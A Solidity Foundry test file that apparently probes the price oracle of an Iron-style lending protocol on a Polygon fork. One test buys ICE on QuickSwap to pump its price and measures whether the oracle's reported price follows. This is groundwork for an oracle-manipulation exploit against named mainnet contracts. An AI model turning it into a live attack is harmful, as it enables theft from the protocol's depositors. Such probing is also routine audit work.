// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "forge-std/Test.sol";

interface IPriceOracle {
    function getUnderlyingPrice(address cToken) external view returns (uint256);
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112, uint112, uint32);
    function swap(uint256, uint256, address, bytes calldata) external;
    function sync() external;
}

interface IUniswapV2Router {
    function swapExactTokensForTokens(uint256, uint256, address[] calldata, address, uint256) external returns (uint256[] memory);
    function getAmountsOut(uint256, address[] calldata) external view returns (uint256[] memory);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function decimals() external view returns (uint8);
}

interface IWMATIC {
    function deposit() external payable;
    function approve(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

contract IronOracleTraceTest is Test {
    address constant IRON_ORACLE = 0x2572ac57821501c33e0750EBA89E9F84B43fc775;
    address constant ICE_MARKET = 0xf535B089453dfd8AE698aF6d7d5Bc9f804781b81;
    address constant DFYN_MARKET = 0x32dbCdaFA80f58FfE45C825cf1Bd04f5260FC596;
    address constant MATIC_MARKET = 0xCa0F37f73174a28a64552D426590d3eD601ecCa1;

    address constant ICE = 0x4A81f8796e0c6Ad4877A51C86693B0dE8093F2ef;
    address constant WMATIC = 0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270;
    address constant QS_ROUTER = 0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff;
    address constant QS_FACTORY = 0x5757371414417b8C6CAad45bAeF941aBc7d3Ab32;

    // Trace: call getUnderlyingPrice for ICE and see what external calls it makes
    function test_traceICEPrice() public view {
        uint256 price = IPriceOracle(IRON_ORACLE).getUnderlyingPrice(ICE_MARKET);
        console.log("ICE price:", price);

        uint256 dfynPrice = IPriceOracle(IRON_ORACLE).getUnderlyingPrice(DFYN_MARKET);
        console.log("DFYN price:", dfynPrice);
    }

    function test_manipulateICEPrice() public {
        // Check ICE price before
        uint256 priceBefore = IPriceOracle(IRON_ORACLE).getUnderlyingPrice(ICE_MARKET);
        console.log("ICE price before:", priceBefore);

        // Buy ICE on QuickSwap to pump the price
        vm.deal(address(this), 1000 ether);
        IWMATIC(WMATIC).deposit{value: 500 ether}();
        IWMATIC(WMATIC).approve(QS_ROUTER, type(uint256).max);

        address[] memory path = new address[](2);
        path[0] = WMATIC;
        path[1] = ICE;

        uint256[] memory amounts = IUniswapV2Router(QS_ROUTER).getAmountsOut(100 ether, path);
        console.log("100 WMATIC -> ICE:", amounts[1]);

        // Do the swap
        IUniswapV2Router(QS_ROUTER).swapExactTokensForTokens(
            100 ether,
            0,
            path,
            address(this),
            block.timestamp + 1000
        );

        // Check ICE price after
        uint256 priceAfter = IPriceOracle(IRON_ORACLE).getUnderlyingPrice(ICE_MARKET);
        console.log("ICE price after:", priceAfter);
        console.log("Price change ratio:", priceAfter * 100 / priceBefore, "%");
    }
}
